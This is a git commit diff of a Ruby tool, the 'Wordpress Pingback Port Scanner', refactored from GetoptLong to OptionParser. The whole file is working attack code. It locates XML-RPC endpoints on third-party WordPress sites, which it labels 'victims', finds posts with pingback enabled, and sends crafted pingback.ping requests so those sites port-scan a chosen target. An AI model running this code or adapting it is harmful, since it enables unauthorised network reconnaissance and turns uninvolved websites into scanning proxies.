da9a24cc8b4a0e7ca8f98abccc96f9109d006f8a
Christian Mehlmauer <firefart@gmail.com>
2013-05-10 22:55:09 +0200

    switched to optparse #4

--- wppps.rb
+++ wppps.rb
@@ -2,35 +2,14 @@
 
 #gem "typhoeus", "= 0.5.3"
 #gem "typhoeus", "= 0.4.2"
-require "rubygems"
-require "getoptlong"
-require "typhoeus"
-require "uri"
+require 'rubygems'
+require 'optparse'
+require 'typhoeus'
+require 'uri'
+require 'ostruct'
 
 class Array
   alias_method :sample, :choice unless method_defined?(:sample)
-end
-
-opts = GetoptLong.new(
-    ["--help", "-h", "-?", GetoptLong::NO_ARGUMENT],
-    ["--target", "-t", GetoptLong::OPTIONAL_ARGUMENT],
-    ["--all-ports", "-a", GetoptLong::NO_ARGUMENT],
-    ["--verbose", "-v", GetoptLong::NO_ARGUMENT]
-)
-
-# Display the usage
-def usage
-  puts "Wordpress Pingback Port Scanner
-
-Usage: wppp.rb [OPTION] ... TARGETS
-  --help, -h: show help
-  --target, -t X: the target to scan - default localhost
-  --all-ports, -a: Scan all ports. Default is to scan only some common ports
-  --verbose, -v: verbose
-
-  TARGETS: a space separated list of targets to use for scanning (must provide a XML-RPC Url)
-
-"
 end
 
 def colorize(text, color_code)
@@ -51,33 +30,33 @@ end
 
 def logo
   puts
-  puts "   _      __            __                       ___  _           __            __"
-  puts "  | | /| / /__  _______/ /__  _______ ___ ___   / _ \\(_)__  ___ _/ /  ___ _____/ /__"
-  puts "  | |/ |/ / _ \\/ __/ _  / _ \\/ __/ -_|_-<(_-<  / ___/ / _ \\/ _ `/ _ \\/ _ `/ __/  '_/"
-  puts "  |__/|__/\\___/_/  \\_,_/ .__/_/  \\__/___/___/ /_/  /_/_//_/\\_, /_.__/\\_,_/\\__/_/\\_\\"
-  puts "     ___           __  /_/___                              /___/"
-  puts "    / _ \\___  ____/ /_  / __/______ ____  ___  ___ ____"
-  puts "   / ___/ _ \\/ __/ __/ _\\ \\/ __/ _ `/ _ \\/ _ \\/ -_) __/"
-  puts "  /_/   \\___/_/  \\__/ /___/\\__/\\_,_/_//_/_//_/\\__/_/"
+  puts '   _      __            __                       ___  _           __            __'
+  puts '  | | /| / /__  _______/ /__  _______ ___ ___   / _ \\(_)__  ___ _/ /  ___ _____/ /__'
+  puts '  | |/ |/ / _ \\/ __/ _  / _ \\/ __/ -_|_-<(_-<  / ___/ / _ \\/ _ `/ _ \\/ _ `/ __/  \'_/'
+  puts '  |__/|__/\\___/_/  \\_,_/ .__/_/  \\__/___/___/ /_/  /_/_//_/\\_, /_.__/\\_,_/\\__/_/\\_\\'
+  puts '     ___           __  /_/___                              /___/'
+  puts '    / _ \\___  ____/ /_  / __/______ ____  ___  ___ ____'
+  puts '   / ___/ _ \\/ __/ __/ _\\ \\/ __/ _ `/ _ \\/ _ \\/ -_) __/'
+  puts '  /_/   \\___/_/  \\__/ /___/\\__/\\_,_/_//_/_//_/\\__/_/'
   puts
-  puts yellow("Warning: this tool only works with Wordpress versions < 3.5.1")
+  puts yellow('Warning: this tool only works with Wordpress versions < 3.5.1')
   puts
 end
 
 def generate_pingback_xml (target, valid_blog_post)
-  xml = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>"
-  xml << "<methodCall>"
-  xml << "<methodName>pingback.ping</methodName>"
-  xml << "<params>"
+  xml = '<?xml version="1.0" encoding="iso-8859-1"?>'
+  xml << '<methodCall>'
+  xml << '<methodName>pingback.ping</methodName>'
+  xml << '<params>'
   xml << "<param><value><string>#{target}</string></value></param>"
   xml << "<param><value><string>#{valid_blog_post}</string></value></param>"
-  xml << "</params>"
-  xml << "</methodCall>"
+  xml << '</params>'
+  xml << '</methodCall>'
   xml
 end
 
 def xml_rpc_url_from_headers(url)
-  if Gem.loaded_specs["typhoeus"].version >= Gem::Version.create(0.5)
+  if Gem.loaded_specs['typhoeus'].version >= Gem::Version.create(0.5)
     resp = Typhoeus::Request.head(url,
                                   :followlocation => true,
                                   :maxredirs => 10,
@@ -92,11 +71,11 @@ def xml_rpc_url_from_headers(url)
   end
   headers = resp.headers_hash
   # Provided by header? Otherwise return nil
-  headers["x-pingback"]
+  headers['x-pingback']
 end
 
 def xml_rpc_url_from_body(url)
-  if Gem.loaded_specs["typhoeus"].version >= Gem::Version.create(0.5)
+  if Gem.loaded_specs['typhoeus'].version >= Gem::Version.create(0.5)
     resp = Typhoeus::Request.get(url,
                                 :followlocation => true,
                                  :maxredirs => 10,
@@ -115,7 +94,7 @@ end
 
 def xml_rpc_url_from_default(url)
   url = get_default_xmlrpc_url(url)
-  if Gem.loaded_specs["typhoeus"].version >= Gem::Version.create(0.5)
+  if Gem.loaded_specs['typhoeus'].version >= Gem::Version.create(0.5)
     resp = Typhoeus::Request.get(url,
                                  :followlocation => true,
                                  :maxredirs => 10,
@@ -141,26 +120,26 @@ def get_xml_rpc_url(url)
       if xmlrpc_url.nil? or xmlrpc_url.empty?
         raise("Url #{url} does not provide a XML-RPC url")
       end
-      puts "Got default XML-RPC Url" if @verbose
+      puts 'Got default XML-RPC Url' if @options.verbose
     else
-      puts "Got XML-RPC Url from Body" if @verbose
+      puts 'Got XML-RPC Url from Body' if @options.verbose
     end
   else
-    puts "Got XML-RPC Url from Headers" if @verbose
+    puts 'Got XML-RPC Url from Headers' if @options.verbose
   end
   xmlrpc_url
 end
 
 def get_default_xmlrpc_url(url)
   uri = URI.parse(url)
-  uri.path << "/" if uri.path[-1] != '/'
-  uri.path << "xmlrpc.php"
+  uri.path << '/' if uri.path[-1] != '/'
+  uri.path << 'xmlrpc.php'
   uri.to_s
 end
 
 def get_pingback_request(xml_rpc, target, blog_post)
   pingback_xml = generate_pingback_xml(target, blog_post)
-  if Gem.loaded_specs["typhoeus"].version >= Gem::Version.create(0.5)
+  if Gem.loaded_specs['typhoeus'].version >= Gem::Version.create(0.5)
     pingback_request = Typhoeus::Request.new(xml_rpc,
                                              :followlocation => true,
                                              :maxredirs => 10,
@@ -183,10 +162,10 @@ end
 def get_valid_blog_post(xml_rpcs)
   blog_posts = []
   xml_rpcs.each do |xml_rpc|
-    url = xml_rpc.sub(/\/xmlrpc\.php$/, "")
+    url = xml_rpc.sub(/\/xmlrpc\.php$/, '')
     # Get valid URLs from Wordpress Feed
     feed_url = "#{url}/?feed=rss2"
-    if Gem.loaded_specs["typhoeus"].version >= Gem::Version.create(0.5)
+    if Gem.loaded_specs['typhoeus'].version >= Gem::Version.create(0.5)
       params = {:followlocation => true, :maxredirs => 10}
     else
       params = {:follow_location => true, :max_redirects => 10}
@@ -198,9 +177,9 @@ def get_valid_blog_post(xml_rpcs)
     end
     links.each do |link|
       temp_link = link[0]
-      puts "Trying #{temp_link}.." if @verbose
+      puts "Trying #{temp_link}.." if @options.verbose
       # Test if pingback is enabled for extracted link
-      pingback_request = get_pingback_request(xml_rpc, "http://www.google.com", temp_link)
+      pingback_request = get_pingback_request(xml_rpc, 'http://www.google.com', temp_link)
       @hydra.queue(pingback_request)
       @hydra.run
       pingback_response = pingback_request.response
@@ -215,7 +194,7 @@ def get_valid_blog_post(xml_rpcs)
   end
 
   if blog_posts.nil? or blog_posts.empty?
-    raise("No valid posts with pingback enabled found")
+    raise('No valid posts with pingback enabled found')
   end
 
   blog_posts
@@ -232,13 +211,13 @@ def is_port_open?(response)
 end
 
 def generate_requests(xml_rpcs, target)
-  port_range = @all_ports ? (0...65535) : [21, 22, 25, 53, 80, 106, 110, 143, 443, 3306, 3389, 8443, 9999]
+  port_range = @options.all_ports ? (0...65535) : [21, 22, 25, 53, 80, 106, 110, 143, 443, 3306, 3389, 8443, 9999]
   port_range.each do |i|
     random = (0...8).map { 65.+(rand(26)).chr }.join
     xml_rpc_hash = xml_rpcs.sample
     uri = URI(target)
     uri.port = i
-    uri.scheme = i == 443 ? "https" : "http"
+    uri.scheme = i == 443 ? 'https' : 'http'
     uri.path = "/#{random}/"
     pingback_request = get_pingback_request(xml_rpc_hash[:xml_rpc], uri.to_s, xml_rpc_hash[:blog_post])
     pingback_request.on_complete do |response|
@@ -247,18 +226,18 @@ def generate_requests(xml_rpcs, target)
       else
         puts yellow("Port #{i} is closed")
       end
-      if @verbose
+      if @options.verbose
         puts "URL: #{uri.to_s}"
         puts "XMLRPC: #{xml_rpc_hash[:xml_rpc]}"
-        puts "Request:"
-        if Gem.loaded_specs["typhoeus"].version >= Gem::Version.create(0.5)
+        puts 'Request:'
+        if Gem.loaded_specs['typhoeus'].version >= Gem::Version.create(0.5)
           puts pingback_request.options[:body]
         else
           puts pingback_request.body
         end
         puts "Response Code: #{response.code}"
         puts response.body
-        puts "##################################"
+        puts '##################################'
       end
     end
     @hydra.queue(pingback_request)
@@ -268,67 +247,70 @@ end
 begin
   logo
 
-  @verbose = false
-  @all_ports = false
-  target = "http://localhost"
   xml_rpcs = []
 
-  # Fix for issue #4
-  arguments = ARGV.dup
+  @options = OpenStruct.new
+  @options.target = 'http://localhost'
+  @options.all_ports = false
+  @options.verbose = false
 
-  begin
-    opts.each do |opt, arg|
-      case opt
-        when "--help"
-          usage
-          exit 0
-        when "--target"
-          if arg !~ /^http/
-            target = "http://" + arg
-          else
-            target = arg
-          end
-        when "--all-ports"
-          @all_ports = true
-        when "--verbose"
-          @verbose = true
-        else
-          raise("Unknown option #{opt}")
+  opt_parser = OptionParser.new do |opts|
+    opts.banner = "Usage: ruby #{opts.program_name}.rb [OPTION] ... VICTIMS"
+    opts.version = '2.0'
+
+    opts.separator ''
+    opts.separator 'Specific options:'
+
+    opts.on('-t', '--target TARGET', 'the target to scan - default localhost') do |value|
+      if value !~ /^http/
+        @options.target = "http://#{value}"
+      else
+        @options.target = value
       end
     end
-  rescue GetoptLong::InvalidOption
-    puts
-    usage
-    exit 1
+
+    opts.on('-a', '--all-ports', 'Scan all ports. Default is to scan only some common ports') do |value|
+      @options.all_ports = value
+    end
+
+    opts.on('-v', '--verbose', 'Enable verbose output') do |value|
+      @options.verbose = value
+    end
+
+    opts.separator ''
+    opts.separator 'VICTIMS: a space separated list of victims to use for scanning (must provide a XML-RPC Url)'
+    opts.separator ''
+
   end
 
-  if arguments.length == 0
-    puts
-    usage
-    exit 1
+  opt_parser.parse!(ARGV)
+
+  if ARGV.empty?
+    puts opt_parser
+    exit(-1)
   end
 
   # Parse XML RPCs
-  arguments.each do |site|
-    url_cleanup = site.sub(/\/xmlrpc\.php$/i, "/")
+  ARGV.each do |site|
+    url_cleanup = site.sub(/\/xmlrpc\.php$/i, '/')
     # add trailing slash
     url_cleanup =~ /\/$/ ? url_cleanup : "#{url_cleanup}/"
     xml_rpcs << get_xml_rpc_url(url_cleanup)
   end
 
   if xml_rpcs.nil? or xml_rpcs.empty?
-    raise("No valid XML-RPC interfaces found")
+    raise('No valid XML-RPC interfaces found')
   end
 
   @hydra = Typhoeus::Hydra.new(:max_concurrency => 10)
 
-  puts "Getting valid blog posts for pingback..."
+  puts 'Getting valid blog posts for pingback...'
   hash = get_valid_blog_post(xml_rpcs)
-  puts "Starting portscan..."
-  generate_requests(hash, target)
+  puts 'Starting portscan...'
+  generate_requests(hash, @options.target)
   @hydra.run
 rescue => e
   puts red("[ERROR] #{e.message}")
-  puts red("Trace :")
+  puts red('Trace :')
   puts red(e.backtrace.join("\n"))
 end
